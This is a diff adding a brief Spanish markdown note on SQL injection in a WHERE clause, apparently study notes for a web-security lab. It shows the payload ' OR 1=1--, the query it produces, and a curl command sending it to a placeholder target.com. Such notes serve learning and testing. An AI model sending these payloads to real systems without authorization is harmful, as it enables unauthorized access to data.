@@ -1,1 +1,14 @@
+# SQL Injection en WHERE Clause
 
+## Input malicioso
+**Input:** `' OR 1=1--`
+
+**Consulta resultante:** 
+```sql
+WHERE category = '' OR 1=1--' AND released = 1
+```
+
+## Comando para probar
+```bash
+curl "https://target.com/products?category=' OR 1=1--"
+```
